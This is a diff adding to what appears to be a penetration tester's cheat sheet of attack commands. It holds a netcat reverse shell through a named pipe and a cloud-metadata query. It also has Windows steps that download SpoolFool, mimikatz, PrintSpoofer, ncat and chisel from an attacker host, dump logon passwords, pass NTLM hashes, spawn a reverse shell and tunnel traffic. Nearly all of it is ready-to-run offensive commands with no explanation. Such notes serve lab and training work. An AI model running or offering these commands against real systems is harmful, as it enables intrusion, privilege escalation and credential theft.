@@ -5,3 +5,29 @@ alias ..='cd .. && l'
 mkfifo /tmp/.zK; nc 10.0.0.1 1337 0</tmp/.zK | /bin/sh >/tmp/.zK 2>&1; rm /tmp/.zK
 
 python -c 'import urllib.request; print(urllib.request.urlopen("http://169.254.169.254/latest/meta-data/").read(999))'
+
+
+# Windows
+
+curl.exe 192.168.45.226:8082/SpoolFool.exe -o SpoolFool.exe
+curl.exe 192.168.45.226:8082/AddUser.dll -o AddUser.dll
+.\SpoolFool.exe -dll AddUser.dll
+
+curl.exe 192.168.45.226:8082/mimikatz.exe -o mimikatz.exe
+.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
+.\mimikatz.exe "sekurlsa::pth /user:alice /domain:corp.com /ntlm:aa...ff /run:PowerShell.exe" "exit"
+
+# Impersonation to root
+curl.exe 192.168.45.226:8082/PrintSpoofer64.exe -o PrintSpoofer64.exe
+curl.exe 192.168.45.226:8082/ncat.exe -o ncat.exe
+.\PrintSpoofer64.exe -c "ncat.exe 192.168.45.226 6666 -e cmd"
+
+# Rev conn
+curl.exe 192.168.45.226:8082/chisel.exe -o chisel.exe
+.\chisel.exe server --socks5
+./chisel client $SRV_IP socks
+proxychains ..
+
+# Remote exec with PtH
+cme smb 192.168.203.123 -u alice -H aa..ff -x 'dir'
+
